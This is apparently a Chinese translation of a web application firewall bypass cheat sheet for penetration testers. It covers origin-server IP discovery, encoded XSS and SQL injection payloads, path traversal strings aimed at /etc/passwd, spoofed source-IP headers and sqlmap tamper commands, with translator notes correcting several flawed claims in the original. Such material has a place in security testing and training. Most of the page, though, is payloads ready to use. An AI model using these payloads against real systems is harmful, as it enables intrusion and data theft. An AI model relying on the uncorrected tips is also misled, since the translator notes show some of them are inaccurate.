<a id="-waf-bypass-cheatsheet"></a>
# 🛡️ WAF 绕过速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./README.tr.md) • [🇬🇷 Ελληνικά](./README.el.md)

```
  ██╗    ██╗ █████╗ ███████╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██║    ██║██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ██║ █╗ ██║███████║█████╗      ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██║███╗██║██╔══██║██╔══╝      ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ╚███╔███╔╝██║  ██║██║         ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝         ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
        Web 应用防火墙绕过        
```

---

<a id="-what-is-waf-bypass"></a>
## 🎯 什么是 WAF 绕过

**WAF 绕过**技术使渗透测试人员能够避开 Web 应用防火墙（WAF），访问源站服务器或传递攻击载荷。

<a id="common-wafs"></a>
### 常见 WAF
- Cloudflare
- AWS WAF
- Akamai
- Imperva/Incapsula
- ModSecurity
- F5 BIG-IP
- Fortinet FortiWeb
- Sucuri

---

<a id="-waf-detection"></a>
## 🔍 WAF 检测

<a id="wafw00f"></a>
### wafw00f
```bash
# 检测 WAF
wafw00f https://target.com

# 详细输出
wafw00f https://target.com -v

# 测试所有 WAF 指纹
wafw00f https://target.com -a
```

<a id="manual-detection"></a>
### 手动检测
```bash
# 检查响应头
curl -I https://target.com

# 查找以下内容：
# - Server: cloudflare
# - X-Sucuri-ID
# - X-CDN: Incapsula
# - cf-ray (Cloudflare)
```

---

<a id="-origin-ip-discovery"></a>
## 🌐 源站 IP 发现

<a id="dns-history"></a>
### DNS 历史记录
```bash
# 可查询的服务：
# - SecurityTrails.com
# - ViewDNS.info/iphistory
# - DNSHistory.org
# - CompleteDNS.com

# SecurityTrails API
curl "https://api.securitytrails.com/v1/history/target.com/dns/a" \
  -H "APIKEY: YOUR_KEY"
```

<a id="ssl-certificate-search"></a>
### SSL 证书搜索
```bash
# 在 Censys.io 搜索证书
# 查找证书中的 target.com

# crt.sh：证书透明度
curl "https://crt.sh/?q=target.com&output=json" | jq

# Censys 命令行工具
censys search "parsed.names: target.com"
```

<a id="shodancensys"></a>
### Shodan/Censys
```bash
# Shodan
shodan search "ssl:target.com"
shodan search "hostname:target.com"

# Shodan：按 SSL 证书哈希查找
shodan search "ssl.cert.fingerprint:XXXX"

# Censys
# 搜索：services.tls.certificates.leaf_data.subject.common_name: target.com
```

<a id="email-headers"></a>
### 邮件头
```bash
# 订阅邮件简报／通知
# 检查邮件头中是否包含源站 IP

# 查找以下内容：
# Received: from [ORIGIN_IP]
# X-Originating-IP: [ORIGIN_IP]
```

<a id="subdomains-without-cdn"></a>
### 未使用 CDN 的子域名
```bash
# 查找子域名
subfinder -d target.com -o subs.txt

# 检查哪些子域名位于 CDN 后方
cat subs.txt | httpx -ip

# 查找以下内容：
# - mail.target.com
# - ftp.target.com
# - dev.target.com
# - staging.target.com
# - api-internal.target.com
# - vpn.target.com
```

<a id="favicon-hash"></a>
### 网站图标（favicon）哈希
```bash
# 获取 favicon 哈希
curl -s https://target.com/favicon.ico | md5sum

# 按 favicon 哈希搜索 Shodan
python3 -c "import mmh3,requests,codecs; print(mmh3.hash(codecs.encode(requests.get('https://target.com/favicon.ico').content,'base64')))"

# Shodan 搜索
shodan search "http.favicon.hash:HASH_VALUE"
```

<a id="ipv6-bypass"></a>
### IPv6 绕过
```bash
# WAF 可能未覆盖 IPv6
dig AAAA target.com
curl -g "http://[IPv6_ADDRESS]/" -H "Host: target.com"
```

<a id="cloud-ranges"></a>
### 云服务 IP 地址范围
```bash
# 下载云服务 IP 地址范围
# AWS: https://ip-ranges.amazonaws.com/ip-ranges.json
# Azure: https://www.microsoft.com/en-us/download/details.aspx?id=56519
# GCP: https://www.gstatic.com/ipranges/cloud.json

# 若目标 IP 不在云服务地址范围内，则可能是源站（局限见译注）
```

---

<a id="-payload-encoding-bypass"></a>
## 🔓 载荷编码绕过

<a id="url-encoding"></a>
### URL 编码
```
# 单次编码
<script> → %3Cscript%3E

# 双重编码
<script> → %253Cscript%253E

# 混合形式
<script> → %3Cscr%69pt%3E
```

<a id="unicode-encoding"></a>
### Unicode 编码
```
# UTF-8（原文标签；本例为无效过长编码，见译注）
<script> → %C0%BC%73%63%72%69%70%74%C0%BE

# Unicode 转义
<script> → \u003cscript\u003e

# HTML 实体
<script> → &#60;script&#62;
<script> → &#x3c;script&#x3e;
```

<a id="case-manipulation"></a>
### 大小写变换
```
<script> → <ScRiPt>
<script> → <SCRIPT>
SELECT → SeLeCt
UNION → UnIoN
```

<a id="null-bytes"></a>
### 空字节
```
# 空字节注入
<scri%00pt>
<script%00>alert(1)</script>
SEL%00ECT
```

<a id="comments"></a>
### 注释
```sql
# SQL 注释
SEL/**/ECT
UNION/**/SELECT
UN/**/ION/**/SE/**/LECT

# 行内注释
SELECT/*comment*/FROM
1'/**/OR/**/1=1--
```

<a id="whitespace-alternatives"></a>
### 空白字符的替代形式
```sql
# 制表符、换行符、回车符
SELECT%09FROM
SELECT%0AFROM
SELECT%0DFROM

# 加号
UNION+SELECT
1'+OR+1=1--
```

---

<a id="-waf-specific-bypasses"></a>
## 🔥 针对 WAF 的绕过方式

<a id="xss-bypass"></a>
### XSS 绕过
```html
# 标准写法被阻止
<script>alert(1)</script>

# 绕过变体
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>

# 不使用圆括号
<img src=x onerror=alert`1`>
<img src=x onerror=alert&lpar;1&rpar;>

# 不使用 alert
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=eval('ale'+'rt(1)')>
```

<a id="sqli-bypass"></a>
### SQL 注入绕过
```sql
# UNION 绕过
UNION SELECT → UNION ALL SELECT
UNION SELECT → /*!50000UNION*/ SELECT
UNION SELECT → %55nion %53elect
UNION SELECT → uNioN sEleCt

# 注释绕过
-- → #
-- → --+
-- → --%00
-- → /**/

# 逻辑表达式绕过
OR 1=1 → OR 2=2
OR 1=1 → OR 'a'='a'
OR 1=1 → || 1=1
AND 1=1 → && 1=1

# 针对特定版本的注释（MySQL）
/*!50000SELECT*/ → 仅在 MySQL >= 5.0 时执行
```

<a id="path-traversal-bypass"></a>
### 路径遍历绕过
```
../../../etc/passwd
..%2F..%2F..%2Fetc/passwd
..%252F..%252F..%252Fetc/passwd
....//....//....//etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

---

<a id="-http-techniques"></a>
## 🛠️ HTTP 技巧

<a id="http-parameter-pollution"></a>
### HTTP 参数污染
```http
# 重复参数
?id=1&id=2
?id=1&ID=2

# 数组注入
?id[]=1&id[]=2
?id=1&id=2&id=3
```

<a id="http-method-tampering"></a>
### HTTP 方法篡改
```bash
# 修改方法
curl -X POST → curl -X PUT
curl -X GET → curl -X TRACE

# 方法覆盖请求头
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
X-HTTP-Method: PATCH
```

<a id="header-manipulation"></a>
### 请求头篡改
```http
# 用于伪造来源 IP 的请求头
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# Content-Type 混淆
Content-Type: application/json
Content-Type: text/plain
Content-Type: application/xml
```

<a id="chunked-encoding"></a>
### 分块传输编码
```http
Transfer-Encoding: chunked

4
test
0
```

---

<a id="-tools"></a>
## 🛠️ 工具

| 工具 | 用途 |
|------|---------|
| **wafw00f** | WAF 检测 |
| **CloudFlair** | Cloudflare 源站发现 |
| **Bypass-Firewalls-by-DNS-History** | DNS 历史记录搜索 |
| **WhatWaf** | WAF 检测与绕过 |
| **sqlmap --tamper** | SQL 注入绕过脚本 |

<a id="sqlmap-tamper-scripts"></a>
### sqlmap 篡改脚本（tamper）
```bash
# 使用 tamper 篡改脚本
sqlmap -u "http://target.com/id=1" --tamper=space2comment
sqlmap -u "http://target.com/id=1" --tamper=randomcase
sqlmap -u "http://target.com/id=1" --tamper=between

# 组合多个 tamper 脚本
sqlmap -u "http://target.com/id=1" --tamper=space2comment,randomcase
```

---

<a id="-quick-reference"></a>
## 📊 速查

| 技术 | 用途 |
|-----------|----------|
| DNS 历史记录 | 查找源站 IP |
| SSL 搜索 | Censys/Shodan 证书搜索 |
| 子域名枚举 | 查找未使用 CDN 的子域名 |
| 编码 | 绕过过滤 |
| 大小写变换 | 绕过简单规则 |
| 注释 | 拆分关键词 |

---

<a id="-resources"></a>
## 📚 参考资料

- [PayloadsAllTheThings WAF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/WAF%20Bypass)
- [HackTricks WAF](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass)
- [OWASP WAF 绕过](https://owasp.org/www-community/attacks/Bypass_Web_Application_Firewall)

---

<p align="center">
  <b>🛡️ 绕过 WAF！</b><br>
  <i>仅用于已获授权的测试！</i>
</p>

> 译注：编码、大小写、注释和 HTTP 技巧是否有效，取决于 WAF 与后端的解析、解码和规则配置，不能视为通用绕过。标为 UTF-8 的 %C0%BC 等是过长编码，不是有效 UTF-8；[RFC 3629](https://www.rfc-editor.org/rfc/rfc3629#section-3)要求解码器拒绝无效序列。SQL 注释不能保证在关键词内部任意拆分后仍构成有效语句；[MySQL 注释文档](https://dev.mysql.com/doc/refman/8.4/en/comments.html)还说明版本化可执行注释的语法与空白要求。分块编码本身也是正常 HTTP 机制，并不自动绕过 WAF。

> 译注：历史 DNS、证书、邮件头、共享图标或云服务地址范围只能提供源站候选，不能单独证明归属或可绕过 WAF。[Shodan 的 favicon 文档](https://blog.shodan.io/deep-dive-http-favicon/)说明，http.favicon.hash 使用 Base64 图标数据的 MurmurHash3；本页 md5sum 得出的 MD5 不能直接用于该搜索过滤器。[Censys 平台 CLI 文档](https://docs.censys.com/docs/platform-cli)区分当前平台与 Legacy Search；原文的查询字段和命令示例须按所用产品、索引与版本核对。原始技术示例均予保留。
